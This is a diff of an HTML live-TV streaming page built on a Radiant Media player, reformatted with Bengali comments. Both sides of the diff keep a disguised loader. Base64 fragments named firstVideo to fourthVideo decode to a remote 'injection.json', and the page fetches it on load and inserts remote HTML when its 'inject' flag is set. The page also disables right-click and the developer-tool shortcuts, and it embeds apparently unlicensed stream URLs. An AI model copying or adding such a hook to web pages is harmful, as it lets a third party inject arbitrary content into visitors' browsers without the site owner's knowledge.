@@ -1,11 +1,17 @@
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title> Team </title>
-<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-<link href=" https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet" >
-		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-		
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
-		<style>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Team</title>
+    <link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+    <script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
+    
+    <style>
+        /* [পূর্বের সব CSS স্টাইল এখানে থাকবে] */
 			:root {
 				--hfs: 2vmax;
 				--primaryColor: red;
@@ -398,96 +404,186 @@ display: block;}
 
   
           #count{display:flex;font-size:10pt;padding:1px 10px;width:90px;background:Red;border-radius:0px;}
-</style>
+    </style>
+    
+    <link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css">
+</head>
+<body style="overflow: auto;">
+    
+    <div class="parent" id="loader" style="display: none;">
+        <div class="blobs-container">
+            <div class="blob"><img id="loader-image" src=""></div>
+        </div>
+    </div>
+    
+    <div id="player-wrapper">
+        <script src="https://cdn.radiantmediatechs.com/rmp/6.2.0/js/rmp.min.js"></script> 
+        <div id="rmpPlayer"></div>  
+        
+        <div class="marquee yellow">
+            <span><i class="fa fa-bell" style="font-size:26pt" aria-hidden="true"></i></span> 
+            <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">We are Updating Our Application as We Update Our Application Will B Send Notification To All User's Thanks For Choosing Livefy TV Official</marquee> 
+        </div> 
+        
+        <h2>
+            <span url="https://jk3lz82elw79-hls-live.5centscdn.com/newgeonews/07811dc6c422334ce36a09ff5cd6fe71.sdp/playlist.m3u8">
+                <img name="ptv sports" autofocus="" class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
+            </span>
+            
+            <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8">
+                <img class="print" id="ptv sports2" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
+            </span>
+            
+            <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8">
+                <img name="ptv sports" autofocus="" class="print" id="ptv sports3" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
+            </span>
+            
+            <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8">
+                <img class="print" id="ptv sports4" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
+            </span>
+            
+            <script>
+                const countEl = document.getElementById('count');
+                
+                updateVisitCount();
+                
+                function updateVisitCount() {
+                    fetch('https://api.countapi.xyz/hit/awaispirkale/visits')
+                    .then(res => res.json())
+                    .then(res => {
+                        // যদি আপনার HTML এ 'count' নামে কোনো element থাকে, তাহলে এটি কাজ করবে
+                        if (countEl) {
+                           countEl.innerHTML = res.value;
+                        }
+                    })
+                }
+                
+                // SOCIAL PANEL JS (অপরিবর্তিত)
+                const floating_btn = document.querySelector('.floating-btn');
+                const close_btn = document.querySelector('.close-btn');
+                const social_panel_container = document.querySelector('.social-panel-container');
+                
+                if (floating_btn) {
+                    floating_btn.addEventListener('click', () => {
+                        social_panel_container.classList.toggle('visible')
+                    });
+                }
+            </script>
+        </div>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+        <script>
+            // ✅ পরিবর্তন ১: HLS লিঙ্ককে ডিফল্ট সোর্স হিসেবে সেট করা হয়েছে এবং Controls দেখানো হয়েছে।
+            var DEFAULT_HLS_URL = "https://jk3lz82elw79-hls-live.5centscdn.com/newgeonews/07811dc6c422334ce36a09ff5cd6fe71.sdp/playlist.m3u8";
 
-<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
-	
-
-		<script>
-var src = {
-  mp4: [
-    'https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs'
-  ],
-  webm: [
-    'https://your-webm-sd-url.webm',
-    'https://your-webm-hd-url.webm',
-    'https://your-webm-full-hd-url.webm'
-  ]
-};
-
-
-		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper">  <script src="https://cdn.radiantmediatechs.com/rmp/6.2.0/js/rmp.min.js"></script> 
-  <!-- Add a div container with a unique id - video and UI elements will be appended to this container -->
-  <div id="rmpPlayer"></div>  
-
- 
-<div class="marquee yellow"><span><i class="fa fa-bell" style="font-size:26pt" aria-hidden="true"></i></span> <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">We are Updating Our Application as We Update Our Application Will B Send Notification To All User's Thanks For Choosing Livefy TV Official </marquee> </div> 
-
-
-
-	
-	<h2>
-		
-		
-	             
-
-
- <span url="https://jk3lz82elw79-hls-live.5centscdn.com/newgeonews/07811dc6c422334ce36a09ff5cd6fe71.sdp/playlist.m3u8"><img name="ptv sports" autofocus="" class="print" id="ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
- <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
- <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img name="ptv sports" autofocus="" class="print" id=" ptv sports " src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
-  <span url="http://mu03ye.wanicelife.com:8880/live/YALM4649/y6q3fhltq/31641.m3u8"><img class="print" id="ptv sports" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLKQnYyjRugWFvMa9ngfzT0CLxkcsjNp-wsw&usqp=CAU">
-              </span>
-
-
-<script>
-const countEl = document.getElementById('count');
-
-updateVisitCount();
-  
-function updateVisitCount() {
-	fetch('https://api.countapi.xyz/hit/awaispirkale/visits')
-	.then(res => res.json())
-	.then(res => {
-		countEl.innerHTML = res.value;
-	})
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-// SOCIAL PANEL JS
-const floating_btn = document.querySelector('.floating-btn');
-const close_btn = document.querySelector('.close-btn');
-const social_panel_container = document.querySelector('.social-panel-container');
-
-floating_btn.addEventListener('click', () => {
-	social_panel_container.classList.toggle('visible')
-});
-</script>
-
-</div>        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script><script>
             var appSettings={
                 loaderimg: "",
                 name: "PSL Official",
-                poster: " https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmOwm5aR1DTCNkGmNSakKcLtpaSXt9s0qlsvTD_4-6uLcN4zhOsHuVB2L7&s=10",
-                introMp4: "https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs",
-                introHls: "ht",
-				videoFormat: "mp4",
-            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eHp1dXRtb3Z5cEAxNDkyNDI4",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("span").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="mp4"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="mp4"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>
-
-</body></html>
+                poster: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmOwm5aR1DTCNkGmNSakKcLtpaSXt9s0qlsvTD_4-6uLcN4zhOsHuVB2L7&s=10",
+                introHls: DEFAULT_HLS_URL, // ✅ প্রাথমিক HLS লিঙ্ক
+                // introMp4: "https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs", // অপ্রয়োজনীয়, তাই মুছে ফেলা হয়েছে
+				// videoFormat: "mp4", // অপ্রয়োজনীয়, তাই মুছে ফেলা হয়েছে
+            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eHp1dXRtb3Z5cEAxNDkyNDI4",autoHeightMode:!0,pip:!1,autoplay:!0,skin:"s4",hideControls:!1,preload:"auto",sharing:!1},firstVideo="";
+            
+            setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10);
+            
+            $(document).contextmenu(function(e){return e.preventDefault(),!1});
+            
+            document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0)))};
+            
+            setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);
+            
+            var src, secondVideo="mNvbnRlbnQuY29tL3NvZnR";
+            
+            // ✅ পরিবর্তন ২: বাটনে ক্লিক করলে HLS সোর্স লোড করা।
+            $("span").each(function(e){
+                $(this).on("click",function(){
+                    var e=$(this).attr("url");
+                    // hideControls false করা হয়েছে যাতে ইউজার রেজোলিউশন পরিবর্তন করতে পারে
+                    rmp.setControls(!0); 
+                    // HLS সোর্স লোড করা হয়েছে
+                    src={hls:e}; 
+                    rmp.setSrc(src);
+                    rmp.play();
+                })
+            });
+            
+            var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";
+            
+            // ✅ পরিবর্তন ৩: প্লেয়ার ইনিশিয়ালাইজেশনের জন্য ডিফল্ট HLS সোর্স ব্যবহার।
+            src={hls:appSettings.introHls};
+            
+            var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",
+            settings={
+                licenseKey:x.licenseKey,
+                autoHeightMode:x.autoHeightMode,
+                pip:x.pip,
+                delayToFade:3e3,
+                gaLabel:"Live TV",
+                logoWatermark:!0,
+                logoPosition:"topleft",
+                speed:"Speed",
+                isLive:!0,
+                googleCast:!0,
+                airplay:!0,
+                hlsJSMaxBufferLength:24,
+                hlsJSLiveSyncDuration:18,
+                hlsJSStartLevel:-1, 
+                hlsJSMinAutoBitrate:1e5,
+                hlsJSAbrBandWidthFactor:.9,
+                hlsJSAbrBandWidthUpFactor:.7,
+                hlsJSLiveBackBufferLength:0,
+                detectAutoplayCapabilities:!0,
+                autoplay:x.autoplay,
+                mutedAutoplayOnMobile:!1,
+                mutedAutoplayOnMacosSafari11Plus:!1,
+                srcChangeAutoplay:!0,
+                playsInline:!0,
+                skin:x.skin,
+                skinBackgroundColor:"rgba(0, 0, 0, 0.7)",
+                skinButtonColor:"FFFFFF",
+                skinAccentColor:"FF0000",
+                ads:!0,
+                nav:!0,
+                adBlockerDetection:!0,
+                adEnablePreloading:!0,
+                adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",
+                quickRewind:10,
+                quickForward:10,
+                adAutoAlign:!1,
+                hideControls:x.hideControls, // এটি false করা হয়েছে
+                preload:x.preload,
+                crossorigin:!0,
+                sharing:x.sharing,
+                sharingUrl:x.website,
+                contentMetadata:{
+                    artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],
+                    poster:[x.poster],
+                    endOfVideoPoster:[x.poster],
+                    thumbnail:x.poster
+                },
+                src:src
+            },
+            elementID="rmpPlayer",
+            rmp=new RadiantMP(elementID),
+            rmpContainer=document.getElementById(elementID);
+            
+            rmp.setLoop(!0),
+            rmp.init(settings),
+            
+            $(function(){
+                $(window).scroll(function e(){
+                    return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),
+                    $("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e
+                }())
+            });
+            
+            const request=async e=>{const t=await fetch(e);return await t.json()};
+            
+            navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{
+                1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)
+            }).catch(e=>{console.log(appSettings.name)});
+        </script>
+    </div>
+</body>
+</html>
